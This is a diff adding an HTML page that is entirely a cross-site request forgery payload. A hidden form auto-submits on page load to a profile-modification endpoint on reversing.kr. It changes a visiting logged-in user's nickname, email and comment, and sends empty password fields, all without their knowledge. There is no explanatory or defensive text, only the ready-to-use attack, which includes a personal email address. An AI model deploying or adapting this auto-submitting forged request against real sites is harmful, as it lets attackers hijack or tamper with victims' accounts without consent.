@@ -1,0 +1,31 @@
+<html>
+
+<body onload="document.forms['modify'].submit()">
+    <form hidden name="modify" action="http://reversing.kr/prc/prc_modify.php" method="post">
+        <dl>
+            <dt>User ID&nbsp;</dt>
+            <dd>4660&nbsp;</dd>
+            <dt>Nick Name</dt>
+            <dd><input type="text" maxlength="15" name="nick" class="sty_txt" value="yaswanth" style="width:200px;" /></dd>
+            <dt>Password</dt>
+            <dd><input type="password" maxlength="100" name="pw1" class="sty_txt" style="width:200px;" /></dd>
+            <dt>Confirm Password</dt>
+            <dd><input type="password" maxlength="100" name="pw2" class="sty_txt" style="width:200px;" /></dd>
+            <dt>E-Mail</dt>
+            <dd><input type="text" name="email" class="sty_txt" style="width:200px;" value="tshaan57@gmail.com" /></dd>
+            <dt>Country</dt>
+            <dd>
+                <select name="country" style="width:200px;" class="sty_txt">
+							<option value="1">?</option>
+						<option value="2">afghanistan</option>
+						</select>
+            </dd>
+            <dt>Comment</dt>
+            <dd><input type="text" name="des" class="sty_txt" style="width:200px;" value="Forzury" /></dd>
+        </dl>
+        <p style="text-align:center;"><br /><input type="submit" value="MODIFY" class="sty_btn" style="width:100px; height:40px;" />
+        </p>
+    </form>
+</body>
+
+</html>
